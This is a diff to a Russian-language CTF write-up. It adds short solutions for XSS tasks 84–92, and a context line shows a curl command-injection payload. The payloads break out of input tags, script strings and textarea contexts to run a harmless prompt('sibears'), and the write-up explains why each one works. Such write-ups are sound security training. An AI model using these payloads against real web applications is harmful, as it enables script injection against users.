@@ -169,6 +169,86 @@ cat flag # idk
 curl 'https://2019-10-13-cmdinj.ctf.su/task/grep' --data-raw 'shell=cat+flag+%23' | jq
 ```
 
+## таск 84 XSS
+
+В коде уязвимость в конкатенации 
+```js
+return '<input type="text" value="' + input + '">;';
+```
+решение 
+```html
+"/><svg/onload=prompt("sibears")>
+```
+так как преобразуется в 
+```html
+<input type="text" value=" "/><svg/onload=prompt("sibears")>">;
+```
+то есть закрываем тег input, создаем картинку, на событие ее загрузки вешаем JS
+
+## таск 85 XSS
+
+Здесь нужно починить синтаксис после конкатенации
+```js
+");prompt("sibears");("
+```
+```html
+<script>console.log("");prompt("sibears");("");</script>
+```
+
+## таск 86 XSS
+
+Некоторые теги на уровне HTML / V8 блокируют исполнение 
+```html
+</textarea><svg/onload=prompt("sibears")>
+```
+```html
+<textarea> </textarea>
+<svg/onload=prompt("sibears")>
+</textarea>
+```
+
+## таск 87 XSS
+
+```html
+<svg/onload=prompt("sibears")>
+```
+```html
+<svg xmlns="http://www.w3.org/1999/svg"> <circle r="10" fill="red"></circle><svg/onload=prompt("sibears")> </svg>
+```
+
+## таск 88 XSS
+
+```html
+JavaScript:prompt(`sibears`)
+```
+```html
+<a href="JavaScript:prompt(`sibears`)">Click ME </a>
+```
+
+## таск 89 XSS
+
+```html
+a}}}}}}}; prompt("sibears");//
+```
+```html
+<script>
+var a = "", b = "";
+var obj = {a: a, b: b, c: {a: a, b: b, c: {a: a, b: b, c: {a: a, b: function(a) { if (a) {return {a: a, b: a}}}}}}}; prompt("sibears");//}}}}}}};
+</script>
+```
+
+## таск 92 XSS
+
+```html
+" onerror=prompt("sibears") onerror="
+```
+```html
+<script src=" " onerror=prompt("sibears") onerror=""></script>
+```
+
+
+
+
 ## таск 106 LFI
 
 ```bash
